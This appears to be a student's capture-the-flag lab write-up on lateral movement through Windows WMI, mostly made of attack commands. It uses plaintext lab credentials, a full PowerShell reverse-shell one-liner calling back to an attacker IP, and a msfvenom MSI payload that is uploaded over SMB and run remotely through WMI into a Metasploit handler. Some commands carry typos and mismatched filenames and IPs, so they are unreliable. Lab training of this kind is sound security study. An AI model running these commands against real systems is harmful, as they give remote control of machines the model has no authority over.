# 5.1 Lateral Movement Using WMI

## Lateral Movement Using WMI

![](5%201%20Lateral%20Movement%20Using%20WMI/images16a873f8-a14a-47c0-b06c-c19292b0190d-1_853_1506_453_247.jpg)

## What is WMI?

What is WMI?
What can WMI actually see and do?

1. Why do IT Admins love it?
2. Why do Attackers love it?

Install WMI in kali linux
WMI Enumeration (Check Access)
Run Commands via WMI (Linux → Windows)
Query OS Info via WMI (Linux)
From Windows (PowerShell)
Create Credential
Query OS Info
Execute Command
Use WMI to execute a PowerShell payload that connects back to your Kali machine
Step 1: Set up a listener on Kali

- Step 2: Use WMI to trigger a reverse shell

WMI Interactive shell Access using process creation (DCOM)
Phase 1: Create the Payload (On AttackBox)
Phase 2: Deliver the Payload (From AttackBox to Target)
Phase 3: Setup the Listener (On AttackBox)
Phase 4: Trigger Execution via WMI (From THMJMP2)
The Result
WMI (Windows Management Instrumentation) is a built-in Windows tool that administrators use to manage computers remotely.

## What can WMI actually see and do?

WMI organizes everything into “Classes.” If it exists in Windows, there is a WMI class for it:

- Hardware Info: “How much RAM is installed?” (Win32_PhysicalMemory)
- Software Info: “What programs are installed?” (Win32_Product )
- Active Processes: “Is Chrome running right now?” ( win32_Process )
- System Controls: “Restart the computer” or “Create a new user.”

## 3. Why do IT Admins love it?

Admins use it for automation. Instead of logging into 100 computers manually to check disk space, they can write a one-line script that asks WMI on all 100 computers: “Hey, how much space is left on your C: drive?”

## 4. Why do Attackers love it?

WMI is a “dual-use” tool. Because it is a legitimate part of Windows, it is often trusted by antivirus software. Attackers use it for:

1. Stealth: You can run commands (like starting a virus) without ever opening a visible window or a command prompt on the target’s screen.
2. Lateral Movement: As seen in your task, if you have an admin’s password, you can use WMI to jump from your current computer to another one on the network.
3. Persistence: You can tell WMI: “Every time this computer starts up, wait 5 minutes and then run my secret script.”

We will move from your AttackBox (Machine A) to THMIIS (Machine B) using THMJMP2 (the pivot/middle machine).

## Install WMI in kali linux

```
sudo apt install wmi-client
```

## WMI Enumeration (Check Access)

```
netexec wmi thmiis.za.tryhackme.com -u t1_corine.waters -p Ko
rine.1994
```

## Run Commands via WMI (Linux → Windows)

```
impacket-wmiexec ZA/t1_corine.waters:Korine.1994@thmiis.za.tr
yhackme.com whoami
impacket-wmiexec ZA/t1_corine.waters:Korine.1994@thmiis.za.tr
yhackme.com hostname
impacket-wmiexec ZA/t1_corine.waters:Korine.1994@thmiis.za.tr
yhackme.com systeminfo
```

## Query OS Info via WMI (Linux)

```
wmic -U ZA/t1_corine.waters%Korine.1994 //thmiis.za.tryhackm
e.com "SELECT Caption, Version FROM Win32_OperatingSystem"
```

## From Windows (PowerShell)

Create Credential

```
$password = 'Korine.1994' | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('ZA\t1_corine.waters', $password)
```

Query OS Info

```
Get-WmiObject -Class Win32_ComputerSystem -ComputerName thmiis.za.tryhackme.com -Credential $cred | Select-Object Name
```

Execute Command

```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName thmiis.za.tryhackme.com -Credential $cred
```

Use WMI to execute a PowerShell payload that connects back to your Kali machine

Step 1: Set up a listener on Kali

```
nc -lvnp 4444
```

Step 2: Use WMI to trigger a reverse shell

```
impacket-wmiexec ZA/t1_corine.waters:Korine.1994@thmiis.za.tryhackme.com "poweshell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.150.74.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read(\$bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$send byte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write(\$sendbyte,0,$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
```

impacket-wmiexec ZA/t1_corine.waters:Korine.1994@thmiis.za.tryhackme.com "powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.150.74.8',4489);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback = (iex \$data 2>&1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""

Replace:

- 10.10.14.10 → your Kali IP
- 4444 → your listener port

## WMI Interactive shell Access using process creation (DCOM)

## Phase 1: Create the Payload (On AttackBox)

First, you create the “hook” that will give you control.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPO
RT=4445 -f msi > hbhinstaller.msi
```

- What this does: Creates an installer that, when run, sends a command prompt back to your IP.

## Phase 2: Deliver the Payload (From AttackBox to Target)

You need to move the file onto the target’s hard drive.

```
smbclient -U 't1_corine.waters' -W ZA '//thmiis.za.tryhackme.
com/admin$/' -c 'put hbhinstaller.msi'
```

- What this does: Uses the stolen credentials to “upload” the file to the ADMIN$ share, which is physically located at c: the target.

## Phase 3: Setup the Listener (On AttackBox)

You must be ready to “catch” the connection when the target executes the file.

```
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/shell_reverse_tcp
msf6 > set LHOST <Your_IP>
msf6 > set LPORT 4445
msf6 > exploit
```

## Phase 4: Trigger Execution via WMI (From THMJMP2)

Now you log into your pivot machine and tell the target to run the file.
Step A: Store Credentials

```
$password = 'Korine.1994' | ConvertTo-SecureString -AsPlainTe
xt -Force
$cred = New-Object System.Management.Automation.PSCredential
('ZA\t1_corine.waters', $password)
```

Step B: Create the Remote WMI Session

```
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName thmiis.za.tryhackme.c
om -Credential $cred -SessionOption $opt
```

- What this does: This creates a “tunnel” between your machine and the target using the DCOM protocol.

## Step C: Execute the Installer

```
Invoke-CimMethod -CimSession $session -ClassName Win32_Produc
t -MethodName Install -Arguments @{PackageLocation = "C:\Wind
ows\hbhinstaller.msi"; Options = ""; AllUsers = $false}
```

- What this does: This is the “Trigger.” It tells the WMI service on the remote machine: “Install the file located at C:|Windows|hbhshell.msi.”

## The Result

Once you run that last PowerShell command, the following happens:

1. THMIIS starts the “installation” of hbhshell.msi .
2. The hidden code inside hbhshell.msi executes.
3. Your AttackBox listener (from Phase 3) suddenly pops up with: Command shell session 1 opened .
4. You are now in. You have moved laterally from Machine A to Machine B.